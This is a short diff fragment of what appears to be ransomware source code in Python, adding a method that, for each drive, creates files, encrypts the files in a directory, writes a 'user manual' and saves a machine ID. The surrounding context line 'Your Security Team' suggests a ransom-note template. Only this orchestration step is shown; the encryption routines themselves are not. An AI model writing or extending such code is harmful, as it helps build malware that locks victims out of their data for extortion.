@@ -299,6 +299,14 @@ Your Security Team
             return False
 
 
+    # Function to process a drive (create files, encrypt, etc.)
+    def process_drive(self, drive):
+        self.create_important_files(drive)
+        self.encrypt_files_in_directory(drive)
+        self.create_user_manual(drive)
+        self.save_machine_id(drive)
+
+
 
 
 
